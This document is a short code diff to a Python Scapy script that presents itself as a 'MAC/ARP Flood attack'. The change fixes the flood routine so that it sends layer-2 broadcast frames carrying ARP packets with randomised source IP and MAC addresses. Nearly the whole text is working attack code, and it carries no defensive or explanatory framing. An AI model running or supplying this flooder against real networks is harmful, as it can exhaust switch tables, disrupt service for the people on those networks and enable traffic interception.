@@ -1,9 +1,9 @@
-from scapy.all import ARP, send, RandMAC, RandIP
+from scapy.all import ARP, sendp, RandMAC, RandIP, Ether
 from time import sleep
 
 def flood():
-    PACKET = ARP(op=1, pdst="255.255.255.255", psrc=RandIP(), hwsrc=RandMAC())
-    send(PACKET, verbose=False)
+    PACKET = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(psrc=RandIP(), hwsrc=RandMAC())
+    sendp(PACKET, verbose=False)
 
 print("[*] Starting MAC/ARP Flood attack... Press Ctrl+C to stop.")
 
